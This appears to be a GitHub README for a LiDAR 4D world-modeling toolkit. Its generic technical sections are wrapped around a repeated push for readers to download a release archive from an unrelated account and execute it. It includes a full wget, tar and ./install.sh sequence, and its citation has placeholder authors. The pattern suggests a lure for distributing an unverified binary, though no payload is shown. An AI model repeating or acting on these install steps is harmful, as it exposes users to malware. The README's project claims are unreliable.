https://github.com/Shark7tv/toolkit/releases

# LiDARCrafter Toolkit — Dynamic 4D World Modeling for LiDAR

[![Releases](https://img.shields.io/github/v/release/Shark7tv/toolkit?label=Releases&color=informational)](https://github.com/Shark7tv/toolkit/releases)  [![License](https://img.shields.io/github/license/Shark7tv/toolkit)](https://github.com/Shark7tv/toolkit/blob/main/LICENSE)  [![PyPI](https://img.shields.io/pypi/v/lidarcrafter-toolkit?label=PyPI&color=blue)](https://pypi.org/project/lidarcrafter-toolkit)  [![Python](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/)

![LiDAR scene banner](https://images.unsplash.com/photo-1545239351-1141bd82e8a6?auto=format&fit=crop&w=1600&q=60)

A focused toolkit for building dynamic 4D world models from LiDAR sequences. Use LiDARCrafter to process point clouds, predict temporal scene flow, detect objects, and synthesize future frames. The repository implements the algorithms and training pipelines from the paper "LiDARCrafter: Dynamic 4D World Modeling from LiDAR Sequences".

Badges above link to the releases page. Download the release file from https://github.com/Shark7tv/toolkit/releases and execute it to install the bundled tools if you prefer binary assets. The release file must be downloaded and executed.

Table of contents

- About the toolkit
- Highlights
- Repository topics
- Quick start
- Releases and binaries
- Installation from source
- Core concepts and design
- Pipeline overview
- Data formats
- Example workflows
  - Inference on a single sequence
  - Batch processing
  - Real-time demo
- API reference
- Model zoo
- Training recipes
- Evaluation metrics and benchmarks
- Visualization and tools
- Debugging and tips
- Contributing
- Citation
- License
- Acknowledgments
- Contact

About the toolkit

LiDARCrafter provides a full stack for 4D scene modeling with LiDAR. The toolkit focuses on three tasks:

- 4D generation: predict future point cloud frames and dynamics.
- 3D object detection in sequences: detect and track objects over time.
- Scene understanding: compute scene flow, semantics, and occupancy.

The code implements data loaders, model definitions, training helpers, evaluation scripts, visualization tools, and prebuilt models. The repo targets research and applied work for autonomous driving, simulation, and AIGC 3D tasks.

Highlights

- Integrated pipeline for sequence-level LiDAR tasks.
- Multi-task model that handles detection, flow, and generation.
- Checkpoints and inference tools in the releases page.
- Utilities for dataset conversion and augmentation.
- Visualization suite for point clouds, flows, and predictions.
- Scripts for converting outputs to common benchmarks.

Repository topics

3d-generation, 3d-object-detection, 4d-generation, aigc, aigc3d, autonomous-driving, generative-ai, lidar, scene-understanding, spatial-intelligence, world-models

Quick start

1) Download the release file and execute it:
- Visit https://github.com/Shark7tv/toolkit/releases
- Download the release asset named like toolkit_release_vX.Y.Z.tar.gz or toolkit_release_vX.Y.Z.zip
- Extract and run the installer or run the provided script

Example:
```bash
wget https://github.com/Shark7tv/toolkit/releases/download/v1.0.0/toolkit_release_v1.0.0.tar.gz
tar -xzf toolkit_release_v1.0.0.tar.gz
cd toolkit_release_v1.0.0
./install.sh
```

The release package contains compiled binaries and prebuilt models. Execute the installer to set PATH entries and install CLI tools.

Releases and binaries

The official release builds live at https://github.com/Shark7tv/toolkit/releases. The release page hosts:
- Pretrained model archives (.pth, .ckpt)
- Packaged CLI tools
- Example datasets for quick tests
- Docker images and compose files
- Install scripts for both Linux and macOS

If you prefer a binary distribution, download the release file and execute it. The installer extracts a local runtime, installs Python packages in a virtual environment, and places CLI tools in bin/.

Installation from source

Use source install for development or to adapt models.

Requirements
- Linux or macOS, Ubuntu 18.04+ recommended
- Python 3.8 or newer
- CUDA 10.2 / 11.x for GPU training
- gcc 7+ and C++17
- pip, virtualenv

Minimal steps
```bash
# Create environment
python -m venv .venv
source .venv/bin/activate
pip install --upgrade pip

# Install core deps
pip install -r requirements.txt

# Build native extensions if needed
python setup.py develop
```

Optional GPU stack
- Install PyTorch matching your CUDA version: https://pytorch.org
- Install CUDA-aware dependencies:
```bash
pip install -r requirements-gpu.txt
```

Docker

A Dockerfile lives in docker/Dockerfile. Build and run:
```bash
docker build -t lidarcrafter:latest -f docker/Dockerfile .
docker run --gpus all -it --rm -v $(pwd):/workspace lidarcrafter:latest /bin/bash
```

Core concepts and design

LiDARCrafter splits the work into modules. Each module follows a clear interface.

- Data: loaders, transforms, and samplers that handle sequences.
- Models: modular blocks for backbone, temporal fusion, and heads.
- Trainer: training manager that handles loss weighting, mixed precision, and distributed runs.
- Inference: scripts to run single-step and multi-step prediction.
- Eval: metrics and parsers to compute detection, flow, and generation scores.
- Viz: tools to render point clouds, flow vectors, and temporal overlays.

Design goals
- Reproducibility: deterministic pipelines and fixed random seeds.
- Modularity: swap backbones or heads with minimal code changes.
- Performance: CPU paths for data prep, GPU for training and inference.
- Extensibility: clear APIs for new datasets or tasks.

Pipeline overview

Typical pipeline for 4D modeling
1. Data ingest: read LiDAR scans for each frame in a sequence.
2. Preprocess: filter, downsample, and normalize point clouds.
3. Augment: random flips, rotations, and temporal jitter.
4. Encode: compute per-frame features via point or voxel backbone.
5. Fuse: apply temporal fusion to aggregate past frames.
6. Predict: run heads for detection, scene flow, and future frame generation.
7. Postprocess: refine boxes, apply NMS, and convert predicted frames.
8. Visualize: render results or export to simulation.

Supported modalities
- Range images
- Raw point clouds (XYZI)
- Bird's-eye view voxels
- Multi-sweep concatenation

Data formats

We use common LiDAR formats. Convert to these expected structures.

Primary input types
- Sequence folder: frames in sequence with timestamped filenames.
- Each frame: binary float32 array with Nx4 columns (x, y, z, intensity).
- Optional metadata: pose files (6DOF), calibration matrices, labels.

Filesystem layout
```
dataset/
  sequences/
    00001/
      000000.bin
      000001.bin
      poses.json
      labels.json
    00002/
      ...
  calib/
    sensor.yaml
```

Read utilities
- loaders/sequence_loader.py: yields (frame, pose, meta)
- converters/kitti_to_toolkit.py: convert common datasets
- scripts/prepare_dataset.sh: batch convert and sample sequences

Example workflows

Inference on a single sequence

Run inference on a saved model. The CLI handles loading and basic visualization.

Command
```bash
lidarcrafter infer --model models/lidarcrafter_v1.pth --sequence data/sequences/00001 --out results/00001
```

Outputs
- predicted_frames/: future point cloud frames in .bin
- detection/: 3D boxes in JSON
- viz/: rendered frames as PNGs
- metrics.json: raw scores if ground truth present

Batch processing

Process a dataset of sequences and write results to a single folder.

Command
```bash
lidarcrafter batch --model models/lidarcrafter_v1.pth --data data/sequences/ --out results/batch --workers 8
```

The batch runner parallelizes sequence-level jobs. It writes progress logs and a summary CSV.

Real-time demo

A demo application reads from a live LiDAR stream (Velodyne, Ouster). The demo uses a small latency mode and runs the PoC model.

Command
```bash
lidarcrafter stream --model models/lidarcrafter_realtime.pth --device /dev/ttyUSB0
```

The stream tool decodes packets, builds frames, and sends them to the inference engine. The demo uses shared memory to pipe results to a rendering frontend.

Model architecture

LiDARCrafter uses a multi-branch architecture:

- Spatial encoder: voxel or point-based encoder that produces per-frame local features.
- Temporal module: transformer-like block or recurrent fusion that merges per-frame features across time.
- Heads:
  - Detection head: anchor-free 3D detector that outputs boxes and classes.
  - Flow head: per-point scene flow vectors predicting motion to the next frame.
  - Generation head: autoregressive or conditional generator that predicts future point clouds.

Key modules
- VoxelEncoder: sparse 3D convolution stack, uses submanifold sparse conv.
- PointEncoder: point transformer or PointNet++ style local aggregation.
- TemporalFusion: cross-frame attention and residual fusion.
- FlowRefiner: multi-scale refinement for scene flow.

Model config

Configs live under configs/*.yaml. Each config contains:
- backbone type
- number of past frames
- voxel size or point sampling count
- learning rate schedule
- loss weights

Example config snippet
```yaml
model:
  backbone: voxel
  voxel_size: [0.05, 0.05, 0.1]
  num_sweeps: 5
training:
  batch_size: 8
  epochs: 80
  optimizer:
    type: AdamW
    lr: 2e-4
loss:
  detection: 1.0
  flow: 2.0
  generation: 0.5
```

API reference

Core modules

- lidarcrafter.data.SequenceDataset
  - __init__(root, seq_len=5, transform=None)
  - __getitem__(idx) -> dict(frame_tensors, poses, labels)
  - __len__()

- lidarcrafter.models.LiDARCrafter
  - forward(seq) -> dict(detections, flow, generated_frames)

- lidarcrafter.trainer.Trainer
  - train(config, resume_from=None)
  - validate(split='val')
  - export_checkpoint(path)

- lidarcrafter.infer.Inferencer
  - load_model(path)
  - infer_sequence(seq_path, out_dir=None)

- lidarcrafter.viz.Renderer
  - render_pointcloud(points, colors=None, flow=None, out_path=None)
  - render_sequence(frames, out_path)

Example code

Load a model and run inference programmatically:
```python
from lidarcrafter.infer import Inferencer

inf = Inferencer()
inf.load_model("models/lidarcrafter_v1.pth")
result = inf.infer_sequence("data/sequences/00001")
print(result["detections"][0])  # first frame boxes
```

Model zoo

We publish several checkpoints on the releases page. Typical entries:
- lidarcrafter_v1.pth — Full model trained on multi-city dataset.
- lidarcrafter_realtime.pth — Low-latency model for demos.
- flow_refiner_v1.pth — Scene flow specialist checkpoint.
- gen_cond_v1.pth — Conditional generator for 1s horizon.

Download the prebuilt checkpoints from https://github.com/Shark7tv/toolkit/releases and place them under models/. The release asset names match the checkpoint names. Download the release file and execute any included installer if present.

Training recipes

We provide recipes for several use cases. Each recipe includes data links, config, and scheduler settings.

Full training (multi-GPU)

Steps
1. Prepare dataset in the required layout.
2. Update configs with data paths and number of GPUs.
3. Launch distributed training.

Launch
```bash
python -m torch.distributed.launch --nproc_per_node=8 tools/train.py --config configs/lidarcrafter_full.yaml
```

Tips
- Use mixed precision to save memory.
- Monitor training loss curves and validation metrics.
- Save checkpoints at intervals and keep last N.

Small-scale training (single GPU)

For debugging or rapid iteration:
```bash
python tools/train.py --config configs/lidarcrafter_small.yaml --epochs 20
```

Fine-tuning

Load a pretrained checkpoint and run a shorter schedule:
```bash
python tools/train.py --config configs/lidarcrafter_finetune.yaml --resume models/lidarcrafter_v1.pth
```

Losses and weighting

The model uses a composite loss:
- Detection loss: box regression and classification (Focal + Smooth L1).
- Flow loss: L2 on predicted flow vectors, plus cyc consistency.
- Generation loss: Chamfer distance, occupancy loss, and adversarial term when enabled.

We recommend starting with balanced weights then adjust based on validation for each task.

Evaluation metrics and benchmarks

We provide scripts to compute standard metrics.

Detection
- mAP (3D) at IoU thresholds 0.5 and 0.7
- Average precision per class
- Tracking metrics (if tracker is used): MOTA, MOTP

Flow
- EPE (endpoint error)
- Accuracy within thresholds
- Percentage of points below threshold

Generation
- Chamfer distance
- Earth mover's distance (EMD)
- FID-style metric for 3D when available

Use the eval script
```bash
python tools/eval.py --pred results/ --gt data/ --task detection,flow,generation --out metrics.json
```

Benchmarks

We include baseline numbers for the sample dataset under benchmarks/. The files show per-model results for detection, flow, and generation. Use these as a guide for expected performance on similar data.

Visualization and tools

Visualizers render point clouds, flows, and detections.

- 3D viewer: HTML/WebGL viewer that supports overlaid point clouds and boxes.
- Local viewer: Open3D-based app that runs on the desktop.
- GIF exporter: convert a sequence to an animated GIF.

Examples
```bash
lidarcrafter render --pred results/00001 --out viz/00001 --mode overlay
```

Rendering options
- color by intensity
- color by semantic label
- render flow vectors as arrows or heatmap
- overlay past frames with alpha blending

Utilities

- converters/kitti_to_toolkit.py
- tools/merge_predictions.py
- tools/pts2pcd.py
- tools/box_utils.py

Debugging and tips

Data issues
- If points look shifted, check pose and calibration files.
- If frames contain NaNs, run the cleaner: tools/clean_pointclouds.py

Training issues
- Loss diverges at the start: reduce learning rate and check data normalization.
- GPU OOM: reduce batch size, switch to gradient accumulation.

Inference issues
- Slow inference: enable torchscript export or use the compiled runtime shipped in releases.
- Wrong detections: verify anchor settings and NMS thresholds.

Performance tuning
- Use mixed precision (AMP) for large models.
- Use sparse conv backbones for voxel paths.
- Profile data loader to ensure CPU does heavy transforms while GPU runs.

Contributing

We accept issues and pull requests. Follow these steps to contribute:

1. Fork the repository.
2. Create a feature branch.
3. Run tests and linters.
4. Submit a pull request with a clear description and tests.

Coding standards
- Keep functions short and focused.
- Add type hints to public functions.
- Write unit tests for new features.

Testing

Run unit tests:
```bash
pytest tests/
```

CI runs lint, unit tests, and a lightweight training run on a small dataset. You can run the CI locally with the included script.

Release process

We tag releases with semantic versioning. Each release bundles:
- model checkpoints
- wheel or source archive
- Docker images
- example data

To create a release:
- Update CHANGELOG.md
- Tag repository and push
- Upload assets to the GitHub release page

The releases page is here: https://github.com/Shark7tv/toolkit/releases. Download the release asset that matches your platform and execute the install script inside the archive if present.

Security

We sign release artifacts when possible. The release page contains checksums for each asset. Verify SHA256 sums before executing unknown binaries.

Model export and deployment

Export options
- TorchScript: for CPU or GPU inference without Python environment.
- ONNX: for runtime inference on different platforms.
- TensorRT: optimized runtime for NVIDIA GPUs.

Export example
```bash
python tools/export.py --model models/lidarcrafter_v1.pth --format torchscript --out exported/lidarcrafter_ts.pt
```

Runtime consumption
- Use the provided runtime wrapper in runtimes/ to load TorchScript artifacts.
- The runtime exposes a simple predict(seq) call returning JSON-friendly outputs.

Data privacy and licensing

If you use private or sensitive datasets, handle them per your organization policy. The repository includes a permissive license to encourage research use. See LICENSE for full terms.

Citation

If you use LiDARCrafter in a paper, cite the paper and the repository. Example BibTeX:
```bibtex
@inproceedings{lidarcrafter2025,
  title = {LiDARCrafter: Dynamic 4D World Modeling from LiDAR Sequences},
  author = {Author, A. and Researcher, B.},
  booktitle = {Proceedings of Example Conference},
  year = {2025},
  url = {https://github.com/Shark7tv/toolkit}
}
```

Community and support

Open an issue for bugs or feature requests. Use discussions for design questions and usage tips. We welcome pull requests with tests and documentation updates.

Roadmap

Planned items
- Multi-sensor fusion (camera + LiDAR)
- Improved generative head with diffusion models
- Real-time optimized runtime for embedded devices
- Expanded model zoo with domain-adapted checkpoints

License

This project uses the MIT License. See LICENSE file for full text.

Acknowledgments

We credit the open source libraries that power the project: PyTorch, Open3D, SparseConvNet, and many others. We include third-party tool licenses where required.

Contact

For questions, open an issue or reach out via the GitHub profile of the maintainer. The releases page has installers and model assets. Visit https://github.com/Shark7tv/toolkit/releases to get the latest release artifacts and follow install instructions there.